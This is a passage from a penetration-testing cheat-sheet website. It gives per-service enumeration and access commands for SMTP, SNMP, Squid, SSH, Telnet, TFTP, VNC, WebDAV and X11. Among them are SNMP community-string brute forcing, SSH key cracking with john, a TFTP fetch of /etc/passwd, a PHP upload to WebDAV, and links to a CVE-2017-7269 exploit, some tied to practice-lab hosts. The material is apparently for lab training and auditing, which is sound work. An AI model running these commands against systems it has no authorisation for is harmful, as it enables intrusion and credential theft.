<td align="left">Send mail from email account, MAIL FROM: <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#109;&#101;&#64;&#109;&#121;&#100;&#111;&#109;&#97;&#105;&#110;&#46;&#99;&#111;&#109;">&#109;&#101;&#64;&#109;&#121;&#100;&#111;&#109;&#97;&#105;&#110;&#46;&#99;&#111;&#109;</a></td>
</tr>
<tr>
<td align="left">NOOP</td>
<td align="left">No-op. Keeps you connection open.</td>
</tr>
<tr>
<td align="left">ONEX</td>
<td align="left">One message transaction only</td>
</tr>
<tr>
<td align="left">QUIT</td>
<td align="left">End session</td>
</tr>
<tr>
<td align="left">RCPT</td>
<td align="left">Send email to recipient,  RCPT TO: <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#121;&#111;&#117;&#64;&#121;&#111;&#117;&#114;&#100;&#111;&#109;&#97;&#105;&#110;&#46;&#99;&#111;&#109;">&#121;&#111;&#117;&#64;&#121;&#111;&#117;&#114;&#100;&#111;&#109;&#97;&#105;&#110;&#46;&#99;&#111;&#109;</a></td>
</tr>
<tr>
<td align="left">RSET</td>
<td align="left">Reset</td>
</tr>
<tr>
<td align="left">SAML</td>
<td align="left">Send and mail</td>
</tr>
<tr>
<td align="left">SEND</td>
<td align="left">Send</td>
</tr>
<tr>
<td align="left">SOML</td>
<td align="left">Send or mail</td>
</tr>
<tr>
<td align="left">STARTTLS</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SUBMITTER</td>
<td align="left">SMTP responsible submitter</td>
</tr>
<tr>
<td align="left">TURN</td>
<td align="left">Turn</td>
</tr>
<tr>
<td align="left">VERB</td>
<td align="left">Verbose</td>
</tr>
<tr>
<td align="left">VRFY</td>
<td align="left">Verify</td>
</tr>
</tbody>
</table>
<p><strong>Tools</strong></p>
<ul>
<li>smtp_enum: <code class="codehilite"><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smtp</span><span class="o">/</span><span class="n">smtp_enum</span></code></li>
<li>smtp-enum-users.nse: <code class="codehilite"><span class="n">nmap</span> <span class="err">–</span><span class="n">script</span> <span class="n">smtp</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span><span class="p">.</span><span class="n">nse</span> <span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">212</span><span class="p">.</span><span class="mi">133</span></code></li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="snmp-161udp">SNMP - 161/udp<a class="headerlink" href="#snmp-161udp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Baed on UDP - Can be suspectable for IP spoofing and replay</li>
<li>1,2,2c versions are plain text</li>
<li>Week auth and default community strings (public, default)</li>
<li>Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered.</li>
<li>Configuration Files
    <div class="codehilite"><pre><span></span><span class="n">snmp</span><span class="p">.</span><span class="n">conf</span>
<span class="n">snmpd</span><span class="p">.</span><span class="n">conf</span>
<span class="n">snmp</span><span class="o">-</span><span class="n">config</span><span class="p">.</span><span class="n">xml</span>
</pre></div></li>
<li>SNMP - Management Information Base (MBI)<ul>
<li>Tree database related to network management.</li>
<li><a href="http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm">http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm</a></li>
<li>commuity strings - public / private / manager / ...</li>
</ul>
</li>
<li>Scanning
    <div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">161</span> <span class="c1">--open &lt;ip&gt;</span>
<span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">161</span> <span class="c1">--script=*snmp* 192.168.1.200</span>
<span class="n">xprobe2</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">p</span> <span class="n">udp</span><span class="p">:</span><span class="mi">161</span><span class="p">:</span><span class="k">open</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">200</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">snmp</span><span class="o">/</span><span class="n">snmp_login</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">snmp</span><span class="o">/</span><span class="n">snmp_enum</span>
</pre></div></li>
<li>Default community strings
    <div class="codehilite"><pre><span></span><span class="k">public</span>
<span class="n">private</span>
<span class="n">cisco</span>
    <span class="n">cable</span><span class="o">-</span><span class="n">docsis</span>
    <span class="n">ILMI</span>
</pre></div></li>
<li>Important Properties:<ul>
<li>Windows NT
  <div class="codehilite"><pre><span></span><span class="nf">.1.3.6.1.2.1.1.5</span> <span class="no">Hostnames</span>
<span class="nf">.1.3.6.1.2.1.4.34.1.5.2.16</span> <span class="no">IPv6</span> <span class="no">Address</span>

<span class="nf">.1.3.6.1.4.1.77.1.4.2</span> <span class="no">Domain</span> <span class="no">Name</span>
<span class="nf">.1.3.6.1.4.1.77.1.2.25</span> <span class="no">Usernames</span>
<span class="nf">.1.3.6.1.4.1.77.1.2.3.1.1</span> <span class="no">Running</span> <span class="no">Services</span>
<span class="nf">.1.3.6.1.4.1.77.1.2.27</span> <span class="no">Share</span> <span class="no">Information</span>
</pre></div></li>
</ul>
</li>
<li>Commands:
    <div class="codehilite"><pre><span></span><span class="n">snmp</span><span class="o">-</span><span class="k">check</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span>
<span class="n">snmpget</span> <span class="o">-</span><span class="n">v</span> <span class="mi">1</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span> <span class="n">IP</span>
<span class="n">snmpbulkwalk</span> <span class="o">-</span><span class="n">v2c</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span> <span class="o">-</span><span class="n">Cn0</span> <span class="o">-</span><span class="n">Cr10</span> <span class="n">IP</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>SNMPWalk
    <div class="codehilite"><pre><span></span><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="c1">--no-upgrade snmp-mibs-downloader</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">snmpwalk</span> <span class="o">-</span><span class="n">Os</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span> <span class="o">-</span><span class="n">v</span> <span class="mi">1</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">snmpwalk</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span> <span class="o">-</span><span class="n">v1</span> <span class="o">-</span><span class="k">On</span>
<span class="n">snmpwalk</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span> <span class="o">-</span><span class="n">v2c</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span>
<span class="n">v3</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">easily</span> <span class="n">guessable</span> <span class="o">/</span> <span class="k">default</span> <span class="n">community</span> <span class="n">string</span>
</pre></div><ul>
<li>Probe MBI
  <div class="codehilite"><pre><span></span><span class="n">snmpwalk</span> <span class="o">-</span><span class="k">c</span> <span class="k">public</span> <span class="o">-</span><span class="n">v</span> <span class="mi">1</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">25</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">25</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span> <span class="k">System</span> <span class="n">Processes</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">25</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span> <span class="n">Running</span> <span class="n">Programs</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">25</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span> <span class="n">Processes</span> <span class="n">Path</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">25</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span> <span class="k">Storage</span> <span class="n">Units</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">25</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span> <span class="n">Software</span> <span class="n">Name</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">77</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">25</span> <span class="k">User</span> <span class="n">Accounts</span>
<span class="err">•</span> <span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">13</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">3</span>   <span class="n">TCP</span> <span class="k">Local</span> <span class="n">Ports</span>
</pre></div></li>
</ul>
</li>
<li>onesixtyone<ul>
<li>Scan one community string for multiple IPs
  <div class="codehilite"><pre><span></span><span class="n">onesixtyone</span> <span class="o">-</span><span class="k">c</span> <span class="n">community</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">i</span> <span class="n">ips</span><span class="p">.</span><span class="n">txt</span>
<span class="n">onesixtyone</span> <span class="o">-</span><span class="k">c</span> <span class="o">/</span><span class="n">pwnt</span><span class="o">/</span><span class="n">passwords</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">SecLists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">SNMP</span><span class="o">/</span><span class="n">snmp</span><span class="p">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span>
</pre></div></li>
</ul>
</li>
<li>snmpenum: <code class="codehilite"><span class="n">perl</span> <span class="n">snmpenum</span><span class="p">.</span><span class="n">pl</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">38</span><span class="p">.</span><span class="mi">200</span> <span class="k">public</span> <span class="n">windows</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>OpUtils</li>
<li>SolarWinds</li>
<li>SNScan</li>
<li>SNMP Scanner</li>
<li>NS Auditor</li>
<li>snmpcheck</li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="squidproxy-3128tcp">SquidProxy - 3128/tcp<a class="headerlink" href="#squidproxy-3128tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Usable in pivoting:<ul>
<li><code class="codehilite"><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">squid_pivot_scanning</span></code></li>
<li><code class="codehilite"><span class="n">nikto</span> <span class="o">-</span><span class="n">h</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span> <span class="o">-</span><span class="n">useproxy</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">):</span><span class="mi">3128</span></code></li>
</ul>
</li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="ssh-22tcp">SSH - 22/tcp<a class="headerlink" href="#ssh-22tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>User Enumeration: <code class="codehilite"><span class="n">searchsploit</span> <span class="o">-</span><span class="n">m</span> <span class="mi">40136</span></code> <code class="codehilite"><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_enumusers</span></code></li>
<li>Configuration Files
    <div class="codehilite"><pre><span></span><span class="n">ssh_config</span>
<span class="n">sshd_config</span>
<span class="n">authorized_keys</span>
<span class="n">ssh_known_hosts</span>
<span class="p">.</span><span class="n">shosts</span>
</pre></div></li>
<li>PPK (Putty) to SSH/RSA key-file
    <div class="codehilite"><pre><span></span><span class="n">puttygen</span> <span class="n">my_private_key</span><span class="p">.</span><span class="n">ppk</span> <span class="o">-</span><span class="n">O</span> <span class="n">private</span><span class="o">-</span><span class="n">openssh</span> <span class="o">-</span><span class="n">o</span> <span class="n">keyfile</span>
<span class="n">chmood</span> <span class="mi">600</span> <span class="n">keyfile</span>
<span class="n">ssh</span> <span class="o">-</span><span class="n">l</span> <span class="p">(</span><span class="n">USERNAME</span><span class="p">)</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span> <span class="o">-</span><span class="n">i</span> <span class="n">keyfile</span>
</pre></div></li>
<li>RSA key cracking 
    <div class="codehilite"><pre><span></span><span class="n">ssh2john</span> <span class="n">id_rsa</span> <span class="o">&gt;</span> <span class="n">id_rsa</span><span class="p">.</span><span class="n">john</span>
<span class="n">john</span> <span class="c1">--wordlist=/path/to/rockyou.txt id_rsa.john</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>scanssh
    <div class="codehilite"><pre><span></span><span class="nv">scanssh</span> <span class="o">-</span><span class="nv">p</span> <span class="o">-</span><span class="nv">r</span> <span class="o">-</span><span class="nv">e</span> <span class="nv">excludes</span> <span class="k">random</span><span class="ss">(</span><span class="nv">no</span>.<span class="ss">)</span><span class="o">/</span><span class="nv">Network_ID</span><span class="o">/</span><span class="nv">Subnet_Mask</span>
</pre></div></li>
<li>HASSH - a Profiling Method for SSH Clients and Servers: <a href="https://github.com/salesforce/hassh/">https://github.com/salesforce/hassh/</a><ul>
<li>"HASSH" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint.</li>
</ul>
</li>
</ul>
<p><strong>Hardening</strong></p>
<ul>
<li>SSH Auditor: <a href="https://github.com/ncsa/ssh-auditor">https://github.com/ncsa/ssh-auditor</a><ul>
<li>Re-check all known hosts as new credentials are added. It will only check the new credentials.</li>
<li>Queue a full credential scan on any new host discovered.</li>
<li>Queue a full credential scan on any known host whose ssh version or key fingerprint changes.</li>
<li>Attempt command execution as well as attempt to tunnel a TCP connection.</li>
<li>Re-check each credential using a per credential scan_interval - default 14 days.</li>
</ul>
</li>
</ul>
<p><strong>References</strong></p>
<h2 id="telnet-23tcp">Telnet - 23/tcp<a class="headerlink" href="#telnet-23tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">inetd</span><span class="p">.</span><span class="n">conf</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">xinetd</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">telnet</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">xinetd</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">stelnet</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>Telnet Honeypot - <a href="https://github.com/stamparm/hontel">https://github.com/stamparm/hontel</a></li>
<li>OS fingerprinting with telnet: <a href="https://securiteam.com/tools/6J00L0K06U/">https://securiteam.com/tools/6J00L0K06U/</a></li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="tftp-69tcp">TFTP - 69/tcp<a class="headerlink" href="#tftp-69tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Enumeration
    <div class="codehilite"><pre><span></span>tftp ip_address PUT local_file
tftp ip_address GET conf.txt <span class="o">(</span>or other files<span class="o">)</span>

Solarwinds TFTP server
tftp – i &lt;IP&gt; GET /etc/passwd <span class="o">(</span>old Solaris<span class="o">)</span>
</pre></div></li>
<li>Connect
    <div class="codehilite"><pre><span></span><span class="nv">TFTP</span>
<span class="nv">tftp</span><span class="o">&gt;</span> <span class="k">connect</span>
<span class="ss">(</span><span class="nv">to</span><span class="ss">)</span> <span class="o">&lt;</span><span class="nv">ip</span><span class="o">&gt;</span>
<span class="nv">tftp</span><span class="o">&gt;</span> <span class="nv">verbose</span>
</pre></div></li>
<li>Transfer file
    <div class="codehilite"><pre><span></span><span class="n">tftp</span><span class="o">&gt;</span> <span class="nb">binary</span>
<span class="n">tftp</span><span class="o">&gt;</span> <span class="n">put</span> <span class="n">example</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">system32</span><span class="o">/</span><span class="n">example</span><span class="p">.</span><span class="n">exe</span>
</pre></div></li>
<li>Receive file
    <div class="codehilite"><pre><span></span><span class="n">tftp</span><span class="o">&gt;</span> <span class="nb">binary</span>
<span class="n">tftp</span><span class="o">&gt;</span> <span class="k">get</span> <span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">system32</span><span class="o">/</span><span class="n">example</span><span class="p">.</span><span class="n">exe</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="vnc-5900tcp">VNC - 5900/tcp<a class="headerlink" href="#vnc-5900tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="na">.vnc</span>
<span class="err">/</span><span class="nf">etc</span><span class="err">/</span><span class="no">vnc</span><span class="err">/</span><span class="no">config</span>
<span class="nf">$HOME</span><span class="err">/</span><span class="no">.vnc</span><span class="err">/</span><span class="no">config</span>
<span class="err">/</span><span class="nf">etc</span><span class="err">/</span><span class="no">sysconfig</span><span class="err">/</span><span class="no">vncservers</span>
<span class="err">/</span><span class="nf">etc</span><span class="err">/</span><span class="no">vnc.conf</span>
</pre></div></li>
<li>Registry locations
    <div class="codehilite"><pre><span></span><span class="err">\</span><span class="n">HKEY_CURRENT_USER</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">ORL</span><span class="err">\</span><span class="n">WinVNC3</span>
<span class="err">\</span><span class="n">HKEY_USERS</span><span class="err">\</span><span class="p">.</span><span class="k">DEFAULT</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">ORL</span><span class="err">\</span><span class="n">WinVNC3</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">QUERY</span> <span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">RealVNC</span><span class="err">\</span><span class="n">vncserver</span>
<span class="n">reg</span> <span class="n">QUERY</span> <span class="n">HKCU</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">TightVNC</span><span class="err">\</span><span class="n">Server</span>
<span class="n">reg</span> <span class="n">QUERY</span> <span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">RealVNC</span><span class="err">\</span><span class="n">vncserver</span>
<span class="n">reg</span> <span class="n">QUERY</span> <span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">RealVNC</span><span class="err">\</span><span class="n">vncserver</span>
</pre></div></li>
<li>Description key: <code class="codehilite"><span class="mi">0</span><span class="n">x238210763578887</span></code></li>
<li>Connect over SSH tunnel
    <div class="codehilite"><pre><span></span>ssh -L5901:127.0.0.1:5901 charix@10.10.10.84
vncviewer <span class="m">127</span>.0.0.1::5901
vncviewer <span class="m">127</span>.0.0.1::5901​ -passwd​ secret
</pre></div></li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="webdev">WebDev<a class="headerlink" href="#webdev" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Check Capabilities: <code class="codehilite"><span class="n">davtest</span> <span class="o">-</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">grandpa</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span></code></li>
<li>Interact<ul>
<li>Command-line WebDAV client for Unix: <a href="http://www.webdav.org/cadaver/">http://www.webdav.org/cadaver/</a></li>
<li>Commands: <a href="https://www.systutorials.com/docs/linux/man/1-cadaver/">https://www.systutorials.com/docs/linux/man/1-cadaver/</a></li>
<li><code class="codehilite"><span class="n">cadaver</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">15</span></code></li>
</ul>
</li>
<li>Upload file: <code class="codehilite"><span class="n">curl</span> <span class="c1">--upload-file ./example.php --user user:password http://&lt;ip&gt;/webdav_url</span></code></li>
<li>Exploits:<ul>
<li>IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl
    - <a href="https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl">https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl</a>
    - <a href="https://github.com/edwardz246003/IIS_exploit">https://github.com/edwardz246003/IIS_exploit</a>
    - <a href="https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html">https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html</a>
    - <a href="https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl">https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl</a></li>
<li>IIS 6.0</li>
</ul>
</li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="x11-6000tcp">X11 - 6000/tcp<a class="headerlink" href="#x11-6000tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span>/etc/Xn.hosts
/usr/lib/X11/xdm
Search through all files <span class="k">for</span> the <span class="nb">command</span> <span class="s2">&quot;xhost +&quot;</span> or <span class="s2">&quot;/usr/bin/X11/xhost +&quot;</span>

/usr/lib/X11/xdm/xsession
/usr/lib/X11/xdm/xsession-remote
/usr/lib/X11/xdm/xsession.0
/usr/lib/X11/xdm/xdm-config
DisplayManager*authorize:on
</pre></div></li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../password-attacks/" title="Password attacks" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Password attacks
              </span>
            </div>
          </a>
        
        
          <a href="../red-blue-team/" title="Red blue team" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Red blue team
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
        <script src="../_site/copy.js"></script>
      
    
  </body>
</html>